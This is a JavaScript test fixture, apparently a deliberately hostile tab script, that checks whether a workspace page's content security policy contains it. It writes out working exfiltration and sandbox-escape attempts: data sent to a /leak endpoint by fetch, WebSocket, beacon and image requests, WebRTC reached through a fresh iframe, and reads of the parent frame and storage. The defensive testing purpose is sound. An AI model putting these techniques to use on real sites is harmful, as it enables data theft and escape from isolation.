// Each attempt records its result, or "blocked: <why>". Network attempts
// count as blocked only when the page's policy reports blocking them, so an
// ordinary network failure cannot pass for the seal. They aim at the
// fixture's /leak on another origin (localhost), which counts every request
// that arrives, so the browser check also proves none got out.
(async () => {
  const report = { inlineScript: window.inlineRan === true, externalScript: true, origin: self.origin, framed: window.top !== window };
  const violations = [];
  document.addEventListener('securitypolicyviolation', event => violations.push({ directive: event.effectiveDirective, uri: String(event.blockedURI) }));
  const attempt = async (name, run) => {
    try { report[name] = await run(); } catch (error) { report[name] = 'blocked: ' + (error && error.name || error); }
  };
  // policyBlocked runs trigger and waits for the policy to report, after
  // the trigger, a URL starting with prefix.
  const policyBlocked = (prefix, trigger) => new Promise(resolve => {
    const before = violations.length;
    trigger().catch(() => {});
    let waited = 0;
    const poll = setInterval(() => {
      const seen = violations.slice(before).find(violation => violation.uri.startsWith(prefix));
      if (seen) { clearInterval(poll); resolve('blocked: ' + seen.directive); }
      else if ((waited += 100) >= 3000) { clearInterval(poll); resolve('not blocked by the policy'); }
    }, 100);
  });
  await attempt('apiFetch', () => policyBlocked(location.origin, () =>
    fetch('/api/memory/proposals/list', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })));
  const outside = `localhost:${location.port}/leak`;
  await attempt('externalFetch', () => policyBlocked('http://localhost:', () => fetch(`http://${outside}/fetch?d=1`)));
  await attempt('webSocket', () => policyBlocked('ws://localhost:', async () => { new WebSocket(`ws://${outside}/socket`); }));
  await attempt('beacon', () => policyBlocked('http://localhost:', async () => { navigator.sendBeacon(`http://${outside}/beacon`, 'd=1'); }));
  await attempt('imageLeak', () => policyBlocked('http://localhost:', async () => { new Image().src = `http://${outside}/image?d=1`; }));
  // Another tab's folder on Evie's origin is not this tab's to load.
  await attempt('otherTabScript', () => policyBlocked(location.origin + '/workspace-tabs/lab/plain-0', async () => {
    const script = document.createElement('script');
    script.src = '/workspace-tabs/lab/plain-0/index.html';
    document.head.appendChild(script);
  }));
  // WebRTC is outside what a page policy can block; Evie's prelude removes
  // it (a partial block), and the check reports whether a frame's fresh
  // window still offers it.
  await attempt('webRTC', () => typeof RTCPeerConnection === 'function' || typeof webkitRTCPeerConnection === 'function' ? 'available' : 'blocked: missing');
  await attempt('webRTCViaFrame', () => {
    const frame = document.createElement('iframe');
    document.body.appendChild(frame);
    const fresh = frame.contentWindow || window.frames[0];
    return fresh && typeof fresh.RTCPeerConnection === 'function' ? 'available' : 'blocked: no fresh window';
  });
  await attempt('localStorage', () => { localStorage.setItem('evie-tab', 'x'); return 'writable'; });
  await attempt('parentDocument', () => report.framed ? 'read: ' + window.parent.document.title : 'not framed');
  await attempt('parentStorage', () => report.framed ? 'read: ' + window.parent.localStorage.length : 'not framed');
  await attempt('popup', () => window.open('/') ? 'opened' : 'blocked: null');
  await attempt('topNavigation', () => { if (report.framed) window.top.location.href = '/#tab-escaped'; return report.framed ? 'attempted' : 'not framed'; });
  report.violations = violations;
  document.getElementById('report').textContent = JSON.stringify(report);
  if (report.framed) {
    window.parent.postMessage({ hostileTab: report }, '*');
    // Last, try to carry data off by navigating this frame elsewhere; Evie's
    // page allows frames only from itself.
    setTimeout(() => { location.href = `http://localhost:${location.port}/leak/navigate?d=1`; }, 200);
  }
})();
